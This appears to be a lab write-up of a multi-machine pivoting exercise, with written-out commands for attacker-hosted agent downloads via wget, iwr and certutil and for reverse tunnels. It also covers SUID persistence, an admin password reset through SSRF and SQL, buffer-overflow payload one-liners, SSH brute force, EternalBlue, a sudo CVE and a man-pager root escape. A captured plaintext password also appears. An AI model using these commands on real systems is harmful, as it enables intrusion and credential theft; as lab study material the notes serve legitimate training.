
NOTE  
For pivoting we use Ligolo-ng which is simpler and more direct, but Ligolo uses a TCP service so in real environments if a company has DPI or a deep inspection firewall it may block the tool. That's when we use chisel or socat since they work over websockets, making it very easy to mask them as normal traffic on port 443.  

To use Ligolo, we run:  
```
sudo ip tuntap add user [our user] mode tun ligolo  
sudo ip link set ligolo up  
```

On the attacker machine, we execute:  
```
./proxy -selfcert -laddr 0.0.0.0:11601  
```

To transfer the binary to the victim, we start a server in the Ligolo folder:  
```
sudo python3 -m http.server 80  
```
On the victim, we download the agent:  
```
wget http://<YOUR_PARROT_IP>:8080/agent -O /tmp/agent  
chmod +x /tmp/agent  
```

If the victim is Windows:  
Using PowerShell (most common method):  
```
iwr -uri http://<YOUR_PARROT_IP>/agent.exe -OutFile C:\Windows\Temp\agent.exe  
```
Or using Certutil (if PowerShell is restricted):  
```
certutil -urlcache -f http://<YOUR_PARROT_IP>/agent.exe C:\Windows\Temp\agent.exe  
```

On the attacker machine, when starting the server, we'll see this:  
![Pasted image 20260317171712](/VaultSite/wiki-images/Pasted%20image%2020260317171712.png)  

And on the victim, we execute:  
```
/tmp/agent -connect <YOUR_PARROT_IP>:11601 -ignore-cert  
```
![Pasted image 20260317171828](/VaultSite/wiki-images/Pasted%20image%2020260317171828.png)  

For Windows:  
```
C:\Windows\Temp\agent.exe -connect <YOUR_PARROT_IP>:11601 -ignore-cert  
```

Now on our machine, we need to accept the session.  
You'll see `New agent connected`. Now interact with it:  

1. Type `session` and press Enter.  
2. Type `1` (or the session number displayed) and press Enter.  
3. Type `start` and press Enter.  
![Pasted image 20260317172007](/VaultSite/wiki-images/Pasted%20image%2020260317172007.png)  

Then, in our Parrot terminal, we need to set the target network with the new interface created by Ligolo, and we're done.  

WE CAN ALSO RUN LIGOLO IN THE BACKGROUND TO AVOID DISTRACTIONS  
`tmux` allows you to create an "invisible" terminal session that you can close and reopen without stopping the process.  

1. **Create a tmux session for Ligolo:**  
    ```
    tmux new -s ligolo  
    ```  
2. **Launch the proxy inside:**  
    ```
    ./proxy -selfcert -laddr 0.0.0.0:11601  
    ```  
3. **Run `session` -> `1` -> `start`.**  
4. **Detach:** Press `Ctrl + B` followed by `D`.  

**Magic!** The Ligolo terminal has disappeared from view but keeps running. To return and manage sessions, just type:

```
tmux attach -t ligolo
```

Machine IP 1 192.168.5.25 10.10.0.128
![Pasted image 20260315181741](/VaultSite/wiki-images/Pasted%20image%2020260315181741.png)
![Pasted image 20260315181801](/VaultSite/wiki-images/Pasted%20image%2020260315181801.png)
After gaining SSH access as root using the backup.sh file and inserting `chmod u+s /bin/bash` inside it, we can now connect as root without credentials via SSH by executing `bash -p`.

Using `ssh-keygen` we create a public key, copy it, go to the directory `-/root/.ssh` and paste the key in authorized_keys. This way we'll have a direct connection from our Parrot machine to argog's root without entering credentials.

Once inside, before doing anything else, we'll scan the network with this script: 

```
#!/bin/bash

for i in $(seq 1 254); do
    for port in 21 22 80 443 445 8080; do
        timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - OPEN" &
    done
done; wait
```
![Pasted image 20260315200048](/VaultSite/wiki-images/Pasted%20image%2020260315200048.png)

Once the hosts are discovered, we'll download chisel on our attacking machine.

We start a server in the chisel folder 
![Pasted image 20260315200836](/VaultSite/wiki-images/Pasted%20image%2020260315200836.png)
and with wget from the victim machine, we download it and give it +x permissions.

![Pasted image 20260315200938](/VaultSite/wiki-images/Pasted%20image%2020260315200938.png)

We start the chisel server on our machine 
![Pasted image 20260315201322](/VaultSite/wiki-images/Pasted%20image%2020260315201322.png)
and the client on the victim 
![Pasted image 20260315201555](/VaultSite/wiki-images/Pasted%20image%2020260315201555.png)
and now the tunnel should be open 
![Pasted image 20260315201619](/VaultSite/wiki-images/Pasted%20image%2020260315201619.png)

Now on the attacking machine, we add this line to proxychains.conf 
![Pasted image 20260315201945](/VaultSite/wiki-images/Pasted%20image%2020260315201945.png)
Now, if we want to run nmap, for example, we'll see we still can't see the new machine's IP 
![Pasted image 20260315202220](/VaultSite/wiki-images/Pasted%20image%2020260315202220.png)
but if we prepend the command with proxychains, it works (nmap is a bit special, and you also need to add -Pn and -sT) 
![Pasted image 20260315202446](/VaultSite/wiki-images/Pasted%20image%2020260315202446.png)
We see a lot of junk output, but that's fine—the info we want appears at the end. We can also redirect it to /dev/null to clean up the output. 
![Pasted image 20260315202614](/VaultSite/wiki-images/Pasted%20image%2020260315202614.png)
Now the tunnel is set up.

To view the web in Firefox, we need to configure FoxyProxy 
![Pasted image 20260315202811](/VaultSite/wiki-images/Pasted%20image%2020260315202811.png)
and now we can see the web page.  
To use tools like gobuster, instead of prepending proxychains, we need to add `--proxy socks5://127.0.0.1:1080`.

### Second Machine  
10.10.0.129

We run an nmap scan and see ports 80 and 22 open.

We run a gobuster scan and find several directories, but one named "joomla" stands out.  
We run another subdirectory scan on that joomla path  
and use the joomscan tool to see if we can extract more info.  
![Pasted image 20260316173544](/VaultSite/wiki-images/Pasted%20image%2020260316173544.png)
We download that .php.bak file.  
![Pasted image 20260317182937](/VaultSite/wiki-images/Pasted%20image%2020260317182937.png)

We also find a note.txt that tells us to use HTTP/3.  
![Pasted image 20260316175922](/VaultSite/wiki-images/Pasted%20image%2020260316175922.png)

To use HTTP through the pivot machine, we need to configure the chisel client to forward port 443 from the Nagini machine to our port 443.  
![Pasted image 20260316180828](/VaultSite/wiki-images/Pasted%20image%2020260316180828.png)

We install Cloudflare's quiche repo.  
When making the HTTP request, it reveals a path.

There, we see a box to make requests to different sites. This hints at an SSRF. We recall that the .bak file had database info with a user named "goblin" and no password. With all this, we'll use gopherus, a tool that exploits (Gopher is a pre-web network protocol from the early '90s designed for searching, organizing, and retrieving documents via hierarchical plaintext menus).

**Gopherus3** is an open-source security tool designed to exploit **Server-Side Request Forgery (SSRF)** vulnerabilities. Its main purpose is to generate payloads using the Gopher protocol, allowing a pentester to turn an SSRF into **Remote Code Execution (RCE)**.

We list the database with gopherus and the "goblin" user, which has no password.  
![Pasted image 20260317182807](/VaultSite/wiki-images/Pasted%20image%2020260317182807.png)

![Pasted image 20260318171554](/VaultSite/wiki-images/Pasted%20image%2020260318171554.png)
Here, we see that by making a request to the server in the "fetch" field, it lists the databases.  
![Pasted image 20260318171542](/VaultSite/wiki-images/Pasted%20image%2020260318171542.png)
We also list the tables in the "joomla" database.  
![Pasted image 20260318171724](/VaultSite/wiki-images/Pasted%20image%2020260318171724.png)
We check two fields: `joomla_users` and `joomla_user_keys`.  
In `joomla_users`, we find the hash for `site_admin`.  
![Pasted image 20260318172338](/VaultSite/wiki-images/Pasted%20image%2020260318172338.png)
We try to crack it but fail, so we check if "goblin" can edit the database to change the site manager's password. The password is "admin," and we need to replace the hash, so we generate the hash for "admin" and insert it: `21232f297a57a5a743894a0e4a801fc3`.  
```sql
USE joomla; UPDATE joomla_users SET password='21232f297a57a5a743894a0e4a801fc3' WHERE email='site_admin@nagini.hogwarts';
```
![Pasted image 20260318173841](/VaultSite/wiki-images/Pasted%20image%2020260318173841.png)
And we've changed it.

![Pasted image 20260318174415](/VaultSite/wiki-images/Pasted%20image%2020260318174415.png)
Upon entering the admin panel, we see this:  
![Pasted image 20260318174531](/VaultSite/wiki-images/Pasted%20image%2020260318174531.png)

Once inside, we review [[eccpt maquina nagini joomla explicacion]] and set up a one-liner to send a bash shell to the pivot machine.  
![Pasted image 20260318181235](/VaultSite/wiki-images/Pasted%20image%2020260318181235.png)

Here, we're sending a bash shell to the Argog machine on port 1111. We don't use our IP since this machine doesn't know it. Now, we use ligolo with the command `listener_add --addr 0.0.0.0:1111 --to 127.0.0.1:1111` to forward port 1111 from Argog to ours.

With `listener -list`, we can see the port forwarding we've set up.  
![Pasted image 20260318182245](/VaultSite/wiki-images/Pasted%20image%2020260318182245.png)
Now, we need to trigger an error on the web server so it executes `error.php`, where our bash shell is stored.  
![Pasted image 20260318183127](/VaultSite/wiki-images/Pasted%20image%2020260318183127.png)
And now we have access.  
![Pasted image 20260318183141](/VaultSite/wiki-images/Pasted%20image%2020260318183141.png)
Once inside, we see this machine has another interface.  
![Pasted image 20260318183258](/VaultSite/wiki-images/Pasted%20image%2020260318183258.png)
So we know there's another subnet.  
Now we do the usual: stabilize the TTY for easier movement.  
After some searching, we find a user named "hermione" we can't access, and in another directory, we find some creds.  
![Pasted image 20260318183756](/VaultSite/wiki-images/Pasted%20image%2020260318183756.png)
We also check the `.ssh` folder but find nothing due to permissions.

We attempt privilege escalation and find an uncommon binary called `su_cp`, suggesting it might be a `cp` command running as root.  
So we generate SSH keys on our machine and transfer them to the victim via the server. Then, using this binary, we copy our keys into hermione's `.ssh` folder, giving us SSH access as hermione.  
![Pasted image 20260318200039](/VaultSite/wiki-images/Pasted%20image%2020260318200039.png)

While listing user files, we find a Firefox database storing passwords. Searching for info on this, we find a tool: https://github.com/unode/firefox_decrypt, which decrypts these files.

We start an HTTP server on port 1234 on the victim and download the `key4.db`, `logins.json`, and `cert9.db` files to our machine.  
![Pasted image 20260318200702](/VaultSite/wiki-images/Pasted%20image%2020260318200702.png)

We save the files in a folder, run the tool with the path, and now we have root credentials.  
![Pasted image 20260318202734](/VaultSite/wiki-images/Pasted%20image%2020260318202734.png)
Running `hostname -I` on the machine reveals another subnet, so we pivot again.  

### STEP 1: The "Repeater" on Aragog  

Since Nagini can't see your Parrot but can see Aragog, we need to create a port on Aragog that "repeats" the signal to your machine.  

1. In your **Ligolo (Proxy)** terminal, select the **Aragog** session (session 1).  

2. Create a listener pointing to your proxy port (usually 11601):

    
    ```
      listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
    ```
    
    Note title: Untitled

_Now Aragog is listening on its own port 11601 and will forward everything it receives through the tunnel to your Proxy._

We spin up an HTTP server on port 8888 to transfer the `agent` binary to Nagini and add a rule to ligolo so that Aragog's port 9090 becomes our 8888.
![Pasted image 20260322163624](/VaultSite/wiki-images/Pasted%20image%2020260322163624.png)

### STEP 2: Prepare Nagini

Transfer the `agent` binary to Nagini (you know the drill: Python server on Parrot -> Listener on Aragog -> wget on Nagini).
![Pasted image 20260322163657](/VaultSite/wiki-images/Pasted%20image%2020260322163657.png)
### STEP 3: Connect the Second Agent

From Nagini's shell, connect **not to your IP**, but to **Aragog's** IP:

Bash

```
# Usa la IP que Nagini ve de Aragog
./agent -connect <IP_DE_ARAGOG>:11601 -ignore-cert
```

### STEP 4: Activate the New Session in Parrot

Return to your Ligolo console in Parrot. You'll see `New agent connected`.

1. Type `session`.
    
2. You'll see two sessions. **Session 2** is Nagini. Select it.
    
3. Type `start`.
    
When raising another connection, we'll need to create another new interface:

sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set dev ligolo2 up
![Pasted image 20260322163959](/VaultSite/wiki-images/Pasted%20image%2020260322163959.png)
start --tun ligolo2

### STEP 5: The New Magic Route

This is the final step. Now that the tunnel reaches Nagini, you need to tell your Parrot OS how to reach the **Machine C** segment.

In a normal terminal on your Parrot:


```
# Supongamos que la red secreta entre Nagini y la Máquina C es 192.168.100.0/24
sudo ip route add 192.168.100.0/24 dev ligolo
```

 Note title: Untitled

Machine 3  
From nagini, we use a one-liner and see that through ping we have discovered 2 machines  
![Pasted image 20260322164805](/VaultSite/wiki-images/Pasted%20image%2020260322164805.png)  
The 128 is our interface because we saw it earlier when running `Hostname -I`.  
We perform a port scan and see that FTP is open with no credentials required, which could allow us to perform a directory listing.  

Upon accessing it, we see a file, so we download it using `get`.  

![Pasted image 20260322165604](/VaultSite/wiki-images/Pasted%20image%2020260322165604.png)  
We see it's an ELF file. We give it permissions and execute it.  
![Pasted image 20260322165814](/VaultSite/wiki-images/Pasted%20image%2020260322165814.png)  
We execute it and see that it does nothing.  
But if we check our ports with `netstat`,  
![Pasted image 20260322170235](/VaultSite/wiki-images/Pasted%20image%2020260322170235.png)  
we see that something is now running on our port 9898.  
![Pasted image 20260322170508](/VaultSite/wiki-images/Pasted%20image%2020260322170508.png)  
We try different spells, but nothing happens, and when we try many, the program hangs.  

![Pasted image 20260322170803](/VaultSite/wiki-images/Pasted%20image%2020260322170803.png)  

So we see that perhaps we need to perform a buffer overflow.  

We open the binary with GDB to debug it and see if we can find the EIP.  
![Pasted image 20260322175442](/VaultSite/wiki-images/Pasted%20image%2020260322175442.png)  
![Pasted image 20260322175515](/VaultSite/wiki-images/Pasted%20image%2020260322175515.png)  
If we run `checksec` in GDB, we see the rules. We notice that NX is disabled, which allows us to attempt to redirect the program flow to a section of the stack where our shellcode is located, enabling us to execute commands.  

![Pasted image 20260322175804](/VaultSite/wiki-images/Pasted%20image%2020260322175804.png)  

Now we generate a string of letters to see exactly where the program breaks and overwrites the EIP.  
![Pasted image 20260322180228](/VaultSite/wiki-images/Pasted%20image%2020260322180228.png)  
We see that the EIP contains `daab`.  
![Pasted image 20260322180312](/VaultSite/wiki-images/Pasted%20image%2020260322180312.png)  
We see that the offset is 112.  
![Pasted image 20260322180357](/VaultSite/wiki-images/Pasted%20image%2020260322180357.png)  
We create a Python string with 112 `A`s to cover the offset, 4 `B`s to fill the EIP, and 100 `C`s to fill the ESP.  
![Pasted image 20260322181447](/VaultSite/wiki-images/Pasted%20image%2020260322181447.png)![Pasted image 20260322181458](/VaultSite/wiki-images/Pasted%20image%2020260322181458.png)  
Here we are looking at the ESP, and with `-4` we tell it to show us the previous 4 characters, which are `424242`, the hexadecimal representation of `B`s.  
![Pasted image 20260322181616](/VaultSite/wiki-images/Pasted%20image%2020260322181616.png)  
So what we see is that the ESP now points to the start of our `C`s, where we could place the shellcode to execute commands. In the EIP, since it comes before, we try to find an address that, at the operation code level, points to a `JUMP ESP`, allowing us to execute code.  

We create a Python script that fills the 112 offset, performs the jump in the EIP, and then places the `C`s.  

To find the address with the jump to place in the EIP, we take the binary and use `objdump` to search for `jmp esp` using `grep`.  
`objdump -d server_hogwarts | grep -i "jmp.*esp"`  

![Pasted image 20260322183339](/VaultSite/wiki-images/Pasted%20image%2020260322183339.png)  
When representing it in the script, it's important to reverse it due to little-endian.  
For example, if the bit sequence is `\x08\x04\x9d\x55`, we would need to write `\x55\x9d\x04\x08`.  

We use `msfvenom` to generate a shellcode.  
![Pasted image 20260322182641](/VaultSite/wiki-images/Pasted%20image%2020260322182641.png)  

Between the EIP and ESP, we place NOPS. (Their primary use is to facilitate the execution of malicious code (_shellcode_) by increasing the success rate of the attack by creating what is known as a **"NOP sled" or "NOP slide"**. Function: When the program's execution flow, diverted by the attacker, lands at any point in this sequence of NOPS, the processor simply "slides" through them until it reaches the malicious code at the end. Purpose: Provides a margin of error (or "room for maneuver") for the attacker, eliminating the need to guess the exact memory address where the shellcode begins.)  
![Pasted image 20260322184331](/VaultSite/wiki-images/Pasted%20image%2020260322184331.png)  
We define the payload by combining everything and define the delivery mechanism, which is a TCP socket, the IP where the service runs, and the port.  

![Pasted image 20260322185027](/VaultSite/wiki-images/Pasted%20image%2020260322185027.png)  

Since we are doing this locally, we have set that IP. In one window, we execute the binary but not in GDB, in another we run `netcat` on the selected port, and in another, we execute the binary.  
![Pasted image 20260322184610](/VaultSite/wiki-images/Pasted%20image%2020260322184610.png)  
![Pasted image 20260322185533](/VaultSite/wiki-images/Pasted%20image%2020260322185533.png)  
And we have it. Now we would need to change the IP in the script and point it to the real machine, generate a new shellcode pointing to the IP of the nagini machine where we are pivoting, and use port 5555 for port forwarding.  
![Pasted image 20260322185827](/VaultSite/wiki-images/Pasted%20image%2020260322185827.png)  

![Pasted image 20260322185924](/VaultSite/wiki-images/Pasted%20image%2020260322185924.png)  

We set up port forwarding.  
`listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555`  
![Pasted image 20260322190413](/VaultSite/wiki-images/Pasted%20image%2020260322190413.png)  
We start a `netcat` listener on port 5555 and execute the edited script.  
![Pasted image 20260322191622](/VaultSite/wiki-images/Pasted%20image%2020260322191622.png)  
We see that we are in a container, so we realize we need to perform a Docker breakout.  
![Pasted image 20260322191930](/VaultSite/wiki-images/Pasted%20image%2020260322191930.png)  

With `ip a`, we see another subnet: 172.17.0.0.  

If we run `sudo -l`, we see that we can do anything.  
![Pasted image 20260322192205](/VaultSite/wiki-images/Pasted%20image%2020260322192205.png)  
![Pasted image 20260322192404](/VaultSite/wiki-images/Pasted%20image%2020260322192404.png)  
With `tcpdump`, we listen to the FTP port on the `eth0` interface.  
![Pasted image 20260322194259](/VaultSite/wiki-images/Pasted%20image%2020260322194259.png)  
We see a user named `neville` with the password `bL!Bsg3k` trying to connect via FTP but failing.  
We check if these credentials work for us via SSH, which is also open.  
![Pasted image 20260322194559](/VaultSite/wiki-images/Pasted%20image%2020260322194559.png)  
We check the SUID files, binaries, etc.  
![Pasted image 20260322194917](/VaultSite/wiki-images/Pasted%20image%2020260322194917.png)  
We see the `sudo` binary with SUID permissions and check its version.  
![Pasted image 20260322195449](/VaultSite/wiki-images/Pasted%20image%2020260322195449.png)  
We see that it has related CVEs.  
https://github.com/worawit/CVE-2021-3156  
We download the `nss.py` script.  

We need to edit the path where it looks for `sudo`.  
![Pasted image 20260322200232](/VaultSite/wiki-images/Pasted%20image%2020260322200232.png)  
![Pasted image 20260322200405](/VaultSite/wiki-images/Pasted%20image%2020260322200405.png)  

Machine 4  
When scanning the network with `nmap`, we see another IP within the same range as nagini and fawkes: 192.168.100.130.  
We scan it with `nmap` and see that it's a Windows 7 machine with the SMB service running.  
![Pasted image 20260322210125](/VaultSite/wiki-images/Pasted%20image%2020260322210125.png)  

So, after seeing this, we use the tool `netexec`, which is like the typical `crackmapexec`, to see what it tells us.  
![Pasted image 20260322210116](/VaultSite/wiki-images/Pasted%20image%2020260322210116.png)  
We see this and think: WINDOWS7 with SMB exposed could be vulnerable to EternalBlue.  
We open Metasploit.  
![Pasted image 20260323170231](/VaultSite/wiki-images/Pasted%20image%2020260323170231.png)  
We search for EternalBlue.  
![Pasted image 20260323170802](/VaultSite/wiki-images/Pasted%20image%2020260323170802.png)  
We configure the exploit and launch it.  
![Pasted image 20260323171252](/VaultSite/wiki-images/Pasted%20image%2020260323171252.png)  
![Pasted image 20260324175601](/VaultSite/wiki-images/Pasted%20image%2020260324175601.png)  
As another option, we could download the repo from https://github.com/3ndG4me/AutoBlue-MS17-010.git.  
We just clone the repository.  
![Pasted image 20260324173700](/VaultSite/wiki-images/Pasted%20image%2020260324173700.png)  

Once inside, we start enumerating. We see another interface: 172.18.0.130.  
![Pasted image 20260324175648](/VaultSite/wiki-images/Pasted%20image%2020260324175648.png)  
![Pasted image 20260324175934](/VaultSite/wiki-images/Pasted%20image%2020260324175934.png)  
We can list the contents of the C: drive but cannot navigate to its root.  

We check and see that we are the `SYSTEM` user, meaning we have maximum privileges. If we didn't, we would use the `kiwi` utility, which is Mimikatz, to dump the SAM.  

With Meterpreter, we upload the agent to the Windows machine.  
![Pasted image 20260324191433](/VaultSite/wiki-images/Pasted%20image%2020260324191433.png)  
Then we spawn a shell and connect to port 11601 of the nagini machine, and we set up port forwarding between the nagini machine and ours.  
![Pasted image 20260324192121](/VaultSite/wiki-images/Pasted%20image%2020260324192121.png)  

To use Ligolo on Windows, it's important that the agent we pass is for the correct architecture.  

**Procedure for pivoting on the Windows machine**  

Since Windows 7 is very old, we do the following: on our machine, we create another Ligolo interface.  
![Pasted image 20260325171459](/VaultSite/wiki-images/Pasted%20image%2020260325171459.png)  
![Pasted image 20260325171523](/VaultSite/wiki-images/Pasted%20image%2020260325171523.png)  

Now we download the old proxy and the old agent and rename them to avoid confusion.  
![Pasted image 20260325172541](/VaultSite/wiki-images/Pasted%20image%2020260325172541.png)  
We start the old server on the interface we created on a port that won't interfere with the other server, for example, 11602.  
![Pasted image 20260325172751](/VaultSite/wiki-images/Pasted%20image%2020260325172751.png)  

Now, in the main proxy, we add a rule to nagini to perform port redirection from 11602.  
![Pasted image 20260325174955](/VaultSite/wiki-images/Pasted%20image%2020260325174955.png)  

Then we pass the old agent binary to Windows 7.  
![Pasted image 20260325174758](/VaultSite/wiki-images/Pasted%20image%2020260325174758.png)  
We used version 7.1.  

Now we go to the Ligolo server and do the usual: `session`, then the session number, and `start --tun ligolo3`.  
![Pasted image 20260325175153](/VaultSite/wiki-images/Pasted%20image%2020260325175153.png)  

Now we simply add the network we saw with Windows to the interface, and that's it.  
![Pasted image 20260325175545](/VaultSite/wiki-images/Pasted%20image%2020260325175545.png)  

MACHINE 5  
We use our typical OneLiner to scan the network.  
![Pasted image 20260325175655](/VaultSite/wiki-images/Pasted%20image%2020260325175655.png)  
We see a new IP: 172.18.0.128. We perform a port scan on it.  

We see an SSH port and an HTTP port.  
![Pasted image 20260325180642](/VaultSite/wiki-images/Pasted%20image%2020260325180642.png)

![Pasted image 20260327171628](/VaultSite/wiki-images/Pasted%20image%2020260327171628.png)
And on the page, after some searching, we find a .gitkeep file which is an empty file used to populate folders and force GitHub to track them  
![Pasted image 20260327171655](/VaultSite/wiki-images/Pasted%20image%2020260327171655.png)

We see the image has a strange name. We test what's on that port and find another web page  
![Pasted image 20260327173052](/VaultSite/wiki-images/Pasted%20image%2020260327173052.png)  
By pressing Ctrl+U we see a weird text string  
![Pasted image 20260327173114](/VaultSite/wiki-images/Pasted%20image%2020260327173114.png)  
If we decode it, it tells us to go to a specific server file. Upon accessing it, we see it's Brainfuck, a type of encoding  
![Pasted image 20260327173159](/VaultSite/wiki-images/Pasted%20image%2020260327173159.png)  

We'll perform brute force against SSH since we only have two password characters left to guess from the given password. Using crunch, we'll generate a password dictionary, and with hydra we'll execute the brute force attack  
![Pasted image 20260327174146](/VaultSite/wiki-images/Pasted%20image%2020260327174146.png)  
![Pasted image 20260327174322](/VaultSite/wiki-images/Pasted%20image%2020260327174322.png)  
![Pasted image 20260327174330](/VaultSite/wiki-images/Pasted%20image%2020260327174330.png)  
And there we have the password  
![Pasted image 20260327174423](/VaultSite/wiki-images/Pasted%20image%2020260327174423.png)  

Upon logging in, we see we're in a restricted bash  
![Pasted image 20260327174540](/VaultSite/wiki-images/Pasted%20image%2020260327174540.png)  
To bypass this, we need to reconnect via SSH but adding bash at the end  
![Pasted image 20260327174856](/VaultSite/wiki-images/Pasted%20image%2020260327174856.png)  
And we see another subnet: 10.15.12.129  
![Pasted image 20260327175058](/VaultSite/wiki-images/Pasted%20image%2020260327175058.png)  
![Pasted image 20260327175127](/VaultSite/wiki-images/Pasted%20image%2020260327175127.png)  
![Pasted image 20260327175246](/VaultSite/wiki-images/Pasted%20image%2020260327175246.png)  

We see we can execute anything as any user, so we run whoami and enter our password to verify, then escalate with sudo su  
![Pasted image 20260327175608](/VaultSite/wiki-images/Pasted%20image%2020260327175608.png)  

Now we'll transfer the agent binary  
![Pasted image 20260327180158](/VaultSite/wiki-images/Pasted%20image%2020260327180158.png)  
![Pasted image 20260327180207](/VaultSite/wiki-images/Pasted%20image%2020260327180207.png)  
![Pasted image 20260327180615](/VaultSite/wiki-images/Pasted%20image%2020260327180615.png)  

Once we have the agent, we give it permissions and execute it  
![Pasted image 20260327180803](/VaultSite/wiki-images/Pasted%20image%2020260327180803.png)  
![Pasted image 20260327180848](/VaultSite/wiki-images/Pasted%20image%2020260327180848.png)  
![Pasted image 20260327181232](/VaultSite/wiki-images/Pasted%20image%2020260327181232.png)  

Machine 6 (final one)  

10.15.12.129  

We perform an nmap scan  
![Pasted image 20260327184828](/VaultSite/wiki-images/Pasted%20image%2020260327184828.png)  
After scanning, we access ports 9999 and 10000  

Port 9999 has a running application, and port 10000 shows a web page with an image  

We'll check if we can list directories with gobuster  
![Pasted image 20260329121703](/VaultSite/wiki-images/Pasted%20image%2020260329121703.png)  
![Pasted image 20260329121713](/VaultSite/wiki-images/Pasted%20image%2020260329121713.png)  
We see a binary that appears to be responsible for port 9999  

When trying to debug it with gdb, we see it won't allow us because it's a Windows binary. So we'll either transfer it to the Dumbledore machine (which had EternalBlue) or simply create a new Windows VM for testing with Immunity Debugger.  

Windows machine IP: 192.168.5.23  
![Pasted image 20260329122312](/VaultSite/wiki-images/Pasted%20image%2020260329122312.png)  

We connect from Parrot and start debugging  
![Pasted image 20260329122609](/VaultSite/wiki-images/Pasted%20image%2020260329122609.png)  
First with !mona modules we'll check the binary's rules  
![Pasted image 20260329140628](/VaultSite/wiki-images/Pasted%20image%2020260329140628.png)  

We'll see where the program crashes and overwrites EIP  
![Pasted image 20260329122939](/VaultSite/wiki-images/Pasted%20image%2020260329122939.png)  
![Pasted image 20260329123011](/VaultSite/wiki-images/Pasted%20image%2020260329123011.png)  
We'll check the offset  
![Pasted image 20260329123133](/VaultSite/wiki-images/Pasted%20image%2020260329123133.png)  
We'll test sending 524 A's followed by 4 B's to see if we get 424242 in EIP 
```
python3 -c 'print("A"*524 + "BBBB" + "C"*100)' | nc -vn [IP_WIN7] 9999
```

And there we see that indeed the point where EIP is overwritten is at 524 
![Pasted image 20260329123339](/VaultSite/wiki-images/Pasted%20image%2020260329123339.png)
And here we see that right after our B's, ESP jumps to the C's 
![Pasted image 20260329123556](/VaultSite/wiki-images/Pasted%20image%2020260329123556.png)
Now let's identify the bad chars 
With mona in Immunity Debugger, we'll enter the following line to generate all possible bytes excluding the null byte (which is usually bad), and it will save the list in mona's logs 
![Pasted image 20260329130635](/VaultSite/wiki-images/Pasted%20image%2020260329130635.png)
`!mona bytearray -cpb \x00`
Or we can also do it manually with this one-liner that will fill ESP with all bytes to see which are bad chars or not:
python3 -c 'import sys; sys.stdout.buffer.write(b"A"* 524 + b"BBBB" + bytes(range(1, 256)))' | nc -vn [IP_WIN7] 9999
![Pasted image 20260329131526](/VaultSite/wiki-images/Pasted%20image%2020260329131526.png)
If we check ESP manually with "follow in dump", we'll need to follow the sequence and see if it breaks. For example, the sequence is 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F. If you see `08 0A`, `09` is missing. That means `\x09` is a Bad Char.  
Here we see there are no bad chars except the null byte.

So now let's find the JMP ESP.

With mona it's very simple—we just tell it to search for a module that jumps to JMP and doesn't contain the null byte to avoid crashing. 
```
!mona jmp -r esp -cpb "\x00"
```
 Here we see the jmp 
 ![Pasted image 20260329141008](/VaultSite/wiki-images/Pasted%20image%2020260329141008.png)
 
Now we will generate the shellcode with msfvenom 
![Pasted image 20260329141457](/VaultSite/wiki-images/Pasted%20image%2020260329141457.png)

We create the payload with all the information we have gathered 
![Pasted image 20260329141704](/VaultSite/wiki-images/Pasted%20image%2020260329141704.png)

Now we start listening on port 4444 which we set in the msfvenom shellcode 
![Pasted image 20260329142126](/VaultSite/wiki-images/Pasted%20image%2020260329142126.png)
and we have already gained access, now what we have to do is point to the IP of the brainpan machine and do port forwarding of port 4444 between matrix and parrot 
![Pasted image 20260329142444](/VaultSite/wiki-images/Pasted%20image%2020260329142444.png)
It is also important that we have to change the shellcode since the IP it needs to point to is not ours but matrix's IP 130 
![Pasted image 20260329142544](/VaultSite/wiki-images/Pasted%20image%2020260329142544.png)
![Pasted image 20260329142710](/VaultSite/wiki-images/Pasted%20image%2020260329142710.png)

![Pasted image 20260329142701](/VaultSite/wiki-images/Pasted%20image%2020260329142701.png)
We verify that we can ping brainpan and we will execute the script
![Pasted image 20260329142809](/VaultSite/wiki-images/Pasted%20image%2020260329142809.png)
and now we are inside, this shell is based on wine and it's a bit messy because it uses both Windows and Linux stuff, that's why many commands don't work but we will fix it by pointing to bash and executing commands directly 

![Pasted image 20260329143828](/VaultSite/wiki-images/Pasted%20image%2020260329143828.png)
![Pasted image 20260329144112](/VaultSite/wiki-images/Pasted%20image%2020260329144112.png)

We will generate a new shellcode to go directly to the Linux tty for privilege escalation 
![Pasted image 20260329144541](/VaultSite/wiki-images/Pasted%20image%2020260329144541.png)
We replace the shellcode in the script and execute it again 
![Pasted image 20260329151322](/VaultSite/wiki-images/Pasted%20image%2020260329151322.png)

We handle the tty and now we have access to the Linux tty 
![Pasted image 20260329151259](/VaultSite/wiki-images/Pasted%20image%2020260329151259.png)

Now for privilege escalation we do a sudo -l and see a binary with root permissions 
![Pasted image 20260329151427](/VaultSite/wiki-images/Pasted%20image%2020260329151427.png)
We execute it with sudo and see that we can use man which here is called manual
**![Pasted image 20260329151618](/VaultSite/wiki-images/Pasted%20image%2020260329151618.png)

With man there is an interesting escalation, if we can execute it as root we can get a root bash 

We execute the binary with a manual whoami at the end and enter paginated mode 
![Pasted image 20260329151820](/VaultSite/wiki-images/Pasted%20image%2020260329151820.png)

And without pressing anything we type !/bin/bash
![Pasted image 20260329151903](/VaultSite/wiki-images/Pasted%20image%2020260329151903.png)
and since we executed the program as root it will give us the root bash 
![Pasted image 20260329151958](/VaultSite/wiki-images/Pasted%20image%2020260329151958.png)


